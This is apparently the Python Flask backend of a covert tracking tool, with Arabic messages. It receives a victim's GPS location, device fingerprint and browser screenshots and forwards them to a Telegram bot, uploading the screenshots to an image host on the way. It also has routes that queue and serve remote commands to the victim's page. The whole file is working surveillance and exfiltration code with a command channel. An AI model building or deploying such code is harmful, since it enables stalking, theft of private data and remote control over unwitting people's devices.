from flask import Flask, request, render_template, jsonify
import requests, base64, os, datetime
from urllib.parse import quote as url_quote  # ✅ بديل آمن ومضمون
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IMGBB_API_KEY

app = Flask(__name__)
latest_command = None
history_log = []

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/map')
def show_map():
    return render_template('map.html', logs=history_log)

@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    send_telegram(data['message'])
    return 'OK'

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    if 'error' in data:
        msg = f"❌ لم يتم السماح بالموقع.\nرسالة: {data['error']}"
    else:
        lat, lon, acc = data['latitude'], data['longitude'], data['accuracy']
        maps = f"https://www.google.com/maps?q={url_quote(str(lat))},{url_quote(str(lon))}"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"📍 <b>الموقع:</b>\n⏰ {timestamp}\nLatitude: {lat}\nLongitude: {lon}\nالدقة: {acc}م\n🔗 <a href='{maps}'>رابط الخريطة</a>"
        history_log.append({'lat': lat, 'lon': lon, 'time': timestamp})
    send_telegram(msg)
    return 'OK'

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'غير معروف')

    isp_info = requests.get("https://ipapi.co/json/").json()
    isp = isp_info.get("org", "غير معروف")
    city = isp_info.get("city", "?")
    country = isp_info.get("country_name", "?")

    msg = f"🧠 <b>معلومات الجهاز:</b>\n🌍 الدولة: {country}\n🏙️ المدينة: {city}\n💼 مزود الإنترنت: {isp}\n🖥️ الجهاز: {ua}\n🌐 IP: {ip}"
    send_telegram(msg)
    return 'OK'

@app.route('/screenshot', methods=['POST'])
def screenshot():
    data_url = request.get_data().decode('utf-8')
    _, encoded = data_url.split(',', 1)
    binary_data = base64.b64decode(encoded)

    with open("temp.png", "wb") as f:
        f.write(binary_data)

    with open("temp.png", "rb") as f:
        res = requests.post("https://api.imgbb.com/1/upload", data={"key": IMGBB_API_KEY}, files={"image": f})
    img_url = res.json()['data']['url']
    send_telegram(f"📸 <b>صورة من الجهاز:</b>\n<a href='{img_url}'>رابط الصورة</a>")
    os.remove("temp.png")
    return 'OK'

@app.route('/get_command', methods=['GET'])
def get_command():
    global latest_command
    cmd = latest_command
    latest_command = None
    return jsonify({'command': cmd})

@app.route('/trigger/<action>', methods=['POST'])
def trigger_action(action):
    global latest_command
    latest_command = action
    send_telegram(f"📡 <b>أمر مستلم:</b> {action}")
    return 'OK'

if __name__ == '__main__':
    app.run(debug=True)
